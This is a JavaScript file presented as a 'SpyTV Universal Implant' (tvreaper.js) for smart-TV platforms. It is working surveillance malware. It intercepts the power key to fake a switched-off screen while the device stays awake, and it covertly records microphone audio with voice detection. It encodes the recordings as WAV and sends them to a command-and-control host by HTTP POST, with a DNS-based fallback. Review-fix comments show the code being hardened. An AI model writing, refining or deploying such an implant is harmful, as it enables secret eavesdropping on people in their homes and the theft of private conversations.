*The Universal JavaScript Implant (tvreaper.js).*

```javascript
/**
 * SpyTV Universal Implant
 * Runs on Tizen, WebOS, Android, HbbTV
 */
(function () {
  const CONFIG = {
    c2Base: "https://C4-FORGE-HOST:7443",
    clipMs: 5 * 60 * 1000,
    vadEnergyFloor: 0.02,
    fakeOff: { active: false, lastUserActivity: Date.now() },
    onScreenOffCapture: true
  };
  let mediaStream = null, ctx = null;

  function log(...a) { try { console.log("[TVREAPER]", ...a); } catch (e) {} }

  // ---------- Fake-Off & power-key interdiction ----------
  function enterFakeOff() {
    CONFIG.fakeOff.active = true;
    if (typeof tizen !== "undefined")
        try { tizen.power.request("SCREEN","SCREEN_OFF"); tizen.power.request("CPU","CPU_AWAKE"); } catch(e){}
    if (typeof webOS !== "undefined")
        try { webOS.platform.tv.setWindowAutoDimEnabled(false); } catch(e){}
    if (typeof AndroidTV !== "undefined")
        try { AndroidTV.screenOff(); } catch(e){}
    document.documentElement.style.visibility = "hidden";
  }
  function exitFakeOff() {
    CONFIG.fakeOff.active = false;
    if (typeof tizen !== "undefined") try { tizen.power.release("CPU"); } catch(e){}
    document.documentElement.style.visibility = "visible";
  }
  function bindPowerKey() {
    document.addEventListener("keydown", e => {
      if ([10250, 4128].includes(e.keyCode) || e.key === "PowerOff") {
        if (CONFIG.fakeOff.active) { exitFakeOff(); return; }
        if (Date.now() - CONFIG.fakeOff.lastUserActivity > 30*60*1000) {
          e.preventDefault(); enterFakeOff();
        }
      }
    });
  }
  // CR-45 fix: Track real user activity instead of unconditionally refreshing
  ["keydown", "mousemove", "touchstart"].forEach(evt => {
    document.addEventListener(evt, () => {
      CONFIG.fakeOff.lastUserActivity = Date.now();
    }, { passive: true });
  });

  // Android-TV native screen-off events (v2)
  if (typeof AndroidTV !== "undefined") {
    try {
      AndroidTV.onScreenOff(() => { if (CONFIG.onScreenOffCapture) enterFakeOff(); });
    } catch (e) {}
  }

  // ---------- Mic capture ----------
  async function captureClip() {
    try {
      if (!mediaStream) mediaStream = await navigator.mediaDevices.getUserMedia({audio:true});
      const ctx = new (window.AudioContext||window.webkitAudioContext)();
      const src = ctx.createMediaStreamSource(mediaStream);
      const proc = ctx.createScriptProcessor(4096,1,1);
      let ring = []; let talking=false, lastLoud=0;
      proc.onaudioprocess = ev => {
        const buf = ev.inputBuffer.getChannelData(0);
        let e=0; for (let i=0;i<buf.length;i++) e += buf[i]*buf[i];
        e = Math.sqrt(e/buf.length);
        if (e > CONFIG.vadEnergyFloor) { talking=true; lastLoud=Date.now(); }
        if (talking || Date.now()-lastLoud < 1500) ring.push(new Float32Array(buf));
      };
      // CR-46 fix: Connect to destination so onaudioprocess fires
      src.connect(proc);
      proc.connect(ctx.destination);
      await new Promise(r => setTimeout(r, CONFIG.clipMs));
      src.disconnect();
      proc.disconnect();
      // CR-46 fix: Stop tracks and close context
      if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
      if (ring.length > 100) exfil(Date.now()+".wav", encodeWav(ring, ctx.sampleRate), "audio");
    } catch (e) { log("mic fail:", e); }
  }
  // CR-47 fix: Use actual sample rate for WAV header
  function encodeWav(frames, sampleRate) {
    const n = frames.reduce((s,f)=>s+f.length,0);
    const buf = new ArrayBuffer(44 + n*2), v = new DataView(buf);
    const w=(o,s)=>{for(let i=0;i<s.length;i++)v.setUint8(o+i,s.charCodeAt(i));};
    w(0,"RIFF"); v.setUint32(4,36+n*2,true); w(8,"WAVE"); w(12,"fmt ");
    v.setUint32(16,16,true); v.setUint16(20,1,true); v.setUint16(22,1,true);
    v.setUint32(24,sampleRate,true); v.setUint32(28,sampleRate*2,true);
    v.setUint16(32,2,true); v.setUint16(34,16,true); w(36,"data");
    v.setUint32(40,n*2,true);
    let off=44;
    for (const f of frames) for (let k=0;k<f.length;k++,off+=2) {
      const s=Math.max(-1,Math.min(1,f[k]));
      v.setInt16(off, s<0?s*0x8000:s*0x7FFF, true);
    }
    return new Blob([buf],{type:"audio/wav"});
  }

  // ---------- Exfil ----------
  async function exfil(name, blob, kind) {
    try {
      const r = await fetch(CONFIG.c2Base+"/tv/"+encodeURIComponent(name)+"?kind="+kind, {method:"POST", body: blob});
      if (r.ok) return;
    } catch (e) {}
    dnsExfil(blob);
  }
  // CR-48 fix: Split base32 data into valid DNS labels
  function dnsExfil(blob) {
    blob.arrayBuffer().then(ab => {
      const data = new Uint8Array(ab.slice(0, 200));
      const enc = b32encode(data);
      const labels = [];
      for (let i = 0; i < enc.length; i += 63) {
        labels.push(enc.slice(i, i + 63));
      }
      for (const label of labels) {
        new Image().src = "https://" + label + ".tv.forge-c2.example/pixel.gif";
      }
    });
  }
  function b32encode(bytes) {
    const A="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"; let bits=0,val=0,out="";
    for (const b of bytes){ val=(val<<8)|b; bits+=8;
      while(bits>=5){out+=A[(val>>>(bits-5))&31];bits-=5;} }
    if(bits>0)out+=A[(val<<(5-bits))&31];
    return out;
  }

  // ---------- Boot ----------
  bindPowerKey();
  setInterval(() => { if (CONFIG.fakeOff.active) captureClip(); }, 61*1000 + Math.random()*1000);
  setInterval(async () => {
    if (CONFIG.fakeOff.active && Math.random()<0.1) {
      // Snapshot logic omitted for brevity, similar to captureClip
    }
  }, 17*60*1000 + Math.random()*4000);
})();
```
